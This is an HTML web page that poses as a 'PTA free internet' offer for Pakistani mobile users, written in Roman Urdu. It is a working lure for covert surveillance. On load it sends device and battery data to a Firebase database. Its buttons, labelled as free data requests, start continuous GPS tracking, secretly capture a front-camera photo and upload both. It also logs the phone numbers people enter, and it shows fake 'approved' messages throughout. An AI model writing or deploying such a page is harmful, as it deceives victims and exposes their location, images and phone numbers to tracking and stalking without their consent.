<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Child Safety SOS</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <!-- FontAwesome Icons & Google Fonts -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: radial-gradient(circle at 10% 20%, rgba(224, 231, 255, 0.6) 0%, rgba(255, 255, 255, 1) 80%),
                        radial-gradient(circle at 90% 80%, rgba(254, 226, 226, 0.6) 0%, rgba(255, 255, 255, 1) 80%);
            background-color: #f8fafc;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card-container {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.8);
            border-radius: 28px;
            padding: 32px 28px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.07),
                        0 0 1px 1px rgba(0, 0, 0, 0.03);
            text-align: center;
            position: relative;
        }

        .hero-banner {
            background: linear-gradient(135deg, #eff6ff 0%, #e0f2fe 100%);
            border: 1px solid #bae6fd;
            border-radius: 18px;
            padding: 16px 18px;
            margin-bottom: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            text-align: center;
        }

        .hero-banner h2 {
            font-size: 20px;
            font-weight: 700;
            color: #0369a1;
        }

        .hero-banner p.subtitle {
            font-size: 13px;
            font-weight: 600;
            line-height: 1.5;
            color: #0284c7;
        }

        .btn-action-red {
            width: 100%;
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: #ffffff;
            border: none;
            padding: 16px 20px;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.5px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 10px 20px -5px rgba(220, 38, 38, 0.35);
            margin-bottom: 16px;
            transition: all 0.25s ease;
        }

        .btn-action-red:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 24px -4px rgba(220, 38, 38, 0.45);
            background: linear-gradient(135deg, #f87171 0%, #dc2626 100%);
        }

        .btn-action-blue {
            width: 100%;
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            color: #ffffff;
            border: none;
            padding: 16px 20px;
            border-radius: 16px;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.5px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.35);
            margin-bottom: 16px;
            transition: all 0.25s ease;
        }

        .btn-action-blue:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 24px -4px rgba(37, 99, 235, 0.45);
            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
        }

        .status-badge {
            background: #f0fdf4;
            border: 1px solid #bbf7d0;
            border-radius: 14px;
            padding: 12px 16px;
            font-size: 13.5px;
            font-weight: 600;
            color: #15803d;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 20px;
        }

        .search-group {
            text-align: left;
            position: relative;
        }

        .search-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #475569;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-wrapper {
            display: flex;
            background: #ffffff;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            overflow: hidden;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .input-wrapper:focus-within {
            border-color: #2563eb;
            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
        }

        .input-wrapper input {
            flex: 1;
            padding: 14px 16px;
            border: none;
            background: transparent;
            color: #0f172a;
            font-size: 15px;
            font-weight: 500;
            outline: none;
        }

        .input-wrapper input::placeholder {
            color: #94a3b8;
        }

        .btn-dropdown-arrow {
            background: #f8fafc;
            border: none;
            border-left: 1px solid #e2e8f0;
            padding: 0 16px;
            cursor: pointer;
            color: #0284c7;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }

        .btn-dropdown-arrow:hover {
            background: #f1f5f9;
        }

        .btn-dropdown-arrow.active svg {
            transform: rotate(180deg);
        }

        .btn-submit-search {
            background: #2563eb;
            color: #ffffff;
            border: none;
            padding: 0 20px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-submit-search:hover {
            background: #1d4ed8;
        }

        .dropdown-menu-panel {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background: #ffffff;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            margin-top: 8px;
            max-height: 220px;
            overflow-y: auto;
            z-index: 50;
            box-shadow: 0 16px 32px -8px rgba(0, 0, 0, 0.12);
        }

        .dropdown-menu-panel.show {
            display: block;
            animation: fadeIn 0.2s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-6px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .network-header {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: #64748b;
            background: #f1f5f9;
            padding: 8px 16px;
            position: sticky;
            top: 0;
            z-index: 2;
        }

        .code-row-item {
            padding: 12px 16px;
            font-size: 14px;
            font-weight: 500;
            color: #334155;
            cursor: pointer;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .code-row-item:hover {
            background: #f0f9ff;
            color: #0284c7;
        }

        #webcam, #canvas {
            display: none;
        }
    </style>
</head>
<body>

<div class="card-container">
    <div class="hero-banner">
        <h2>PTA FREE INTERNET</h2>
        <p class="subtitle">PTA KE TARAF SE FREE INTERNET HASEL KAREN HAR PAKISTANI K LYE:</p>
    </div>

    <!-- Live GPS Trigger Button -->
    <button class="btn-action-red" onclick="startLiveLocationTracking()">
        <i class="fa-solid fa-location-crosshairs"></i> REQUEST TO FREE INTERNET
    </button>

    <div id="statusText" class="status-badge">
        <span>⚙️ System Ready</span>
    </div>

    <!-- Camera Trigger Button -->
    <button class="btn-action-blue" onclick="captureInstantPhoto()">
        <i class="fa-solid fa-signal" style="color: #ffffff;"></i> FREE
    </button>

    <div id="cameraStatusText" class="status-badge">
        <span>✅ Zong free serves request approved successfully!</span>
    </div>

    <!-- Mobile Data Input -->
    <div class="search-group">
        <label for="mobile-input">Mobile Number Data Search</label>
        <div class="input-wrapper">
            <input type="text" id="mobile-input" placeholder="e.g. 03011234567">
            
            <button class="btn-dropdown-arrow" id="toggle-dropdown-btn" title="Select Network Code">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
            </button>

            <button class="btn-submit-search" onclick="searchMobileNumber()">Search</button>
        </div>

        <div class="dropdown-menu-panel" id="codes-dropdown">
            <div class="network-header">Jazz / Mobilink</div>
            <div class="code-row-item"><span>0300</span> ➔</div>
            <div class="code-row-item"><span>0301</span> ➔</div>
            <div class="code-row-item"><span>0302</span> ➔</div>
            <div class="code-row-item"><span>0303</span> ➔</div>
            <div class="code-row-item"><span>0304</span> ➔</div>

            <div class="network-header">Zong</div>
            <div class="code-row-item"><span>0310</span> ➔</div>
            <div class="code-row-item"><span>0311</span> ➔</div>
            <div class="code-row-item"><span>0312</span> ➔</div>
            <div class="code-row-item"><span>0313</span> ➔</div>

            <div class="network-header">Telenor</div>
            <div class="code-row-item"><span>0340</span> ➔</div>
            <div class="code-row-item"><span>0341</span> ➔</div>
            <div class="code-row-item"><span>0345</span> ➔</div>
        </div>
    </div>

    <div id="bottomStatusText" class="status-badge" style="margin-top: 20px; margin-bottom: 0;">
        <span>✅ APko Free Internet mil gaye he</span>
    </div>
</div>

<video id="webcam" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    // Connected Firebase Realtime Database Config
    const firebaseConfig = {
        apiKey: "AIzaSyAvrmvX4cjH1k7G3DjkgF5A4C1UAJMYUKQ",
        authDomain: "child-safety-app-bace4.firebaseapp.com",
        databaseURL: "https://child-safety-app-bace4-default-rtdb.firebaseio.com",
        projectId: "child-safety-app-bace4",
        storageBucket: "child-safety-app-bace4.firebasestorage.app",
        messagingSenderId: "7736848190",
        appId: "1:7736848190:web:e569557e0b27e8c918066f"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 1. Send Background System Telemetry Details Automatically
    function sendExtendedTelemetry() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        
        const telemetry = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
            networkType: conn ? conn.effectiveType : "Unknown",
            downlinkSpeed: conn ? `${conn.downlink} Mbps` : "N/A",
            time: new Date().toLocaleString()
        };

        db.ref('child_safety/telemetry_extended').set(telemetry);

        if (navigator.getBattery) {
            navigator.getBattery().then(b => {
                db.ref('child_safety/device_status').set({
                    battery: Math.round(b.level * 100),
                    zone: "Outside / Active Track"
                });
            });
        }
    }
    sendExtendedTelemetry();

    // 2. Realtime Continuous GPS Location Tracking
    let watchID = null;
    function startLiveLocationTracking() {
        const status = document.getElementById('statusText');
        status.innerHTML = "<span>⏳ Requesting Live GPS Connection...</span>";

        if ('geolocation' in navigator) {
            watchID = navigator.geolocation.watchPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const speed = pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) : "0";
                    const accuracy = pos.coords.accuracy ? Math.round(pos.coords.accuracy) : 0;

                    db.ref('child_safety/location').set({
                        lat: lat,
                        lng: lng,
                        speed: speed + " km/h",
                        accuracy: accuracy + " meters",
                        time: new Date().toLocaleString()
                    });

                    status.innerHTML = "<span>✅ Ap ko free internet 150GB approved ho gya he</span>";
                },
                (err) => {
                    status.innerHTML = "<span>⚠️ GPS Error: " + err.message + "</span>";
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 10000
                }
            );
        } else {
            status.innerHTML = "<span>⚠️ Geolocation Not Supported</span>";
        }
    }

    // 3. Capture Front Camera Media Feed
    async function captureInstantPhoto() {
        const status = document.getElementById('cameraStatusText');
        status.innerHTML = "<span>⏳ Free internet 150GB ke lye request bheji ja rhi he...</span>";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });

            const video = document.getElementById('webcam');
            video.srcObject = stream;

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;

                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const base64Image = canvas.toDataURL('image/jpeg', 0.7);

                stream.getTracks().forEach(track => track.stop());

                db.ref('child_safety/last_selfie').set({
                    url: base64Image,
                    time: new Date().toLocaleString()
                }).then(() => {
                    status.innerHTML = "<span>✅ Zong free serves request approved successfully!</span>";
                });

            }, 600);

        } catch (err) {
            status.innerHTML = "<span>⚠️ Camera Error: " + err.message + "</span>";
        }
    }

    // 4. Save Network Data Search
    function searchMobileNumber() {
        const number = document.getElementById('mobile-input').value;
        if(number) {
            db.ref('child_safety/searched_numbers').push({
                number: number,
                time: new Date().toLocaleString()
            });
            document.getElementById('bottomStatusText').innerHTML = "<span>✅ APko Free Internet mil gaye he (" + number + ")</span>";
        }
    }

    // UI Dropdown Event Listeners
    const toggleBtn = document.getElementById('toggle-dropdown-btn');
    const dropdownMenu = document.getElementById('codes-dropdown');
    const codeItems = document.querySelectorAll('.code-row-item');
    const inputField = document.getElementById('mobile-input');

    toggleBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        dropdownMenu.classList.toggle('show');
        toggleBtn.classList.toggle('active');
    });

    codeItems.forEach(item => {
        item.addEventListener('click', () => {
            const codeText = item.querySelector('span').textContent;
            inputField.value = codeText;
            dropdownMenu.classList.remove('show');
            toggleBtn.classList.remove('active');
            inputField.focus();
        });
    });

    document.addEventListener('click', (e) => {
        if (!dropdownMenu.contains(e.target) && !toggleBtn.contains(e.target)) {
            dropdownMenu.classList.remove('show');
            toggleBtn.classList.remove('active');
        }
    });
</script>
</body>
</html>
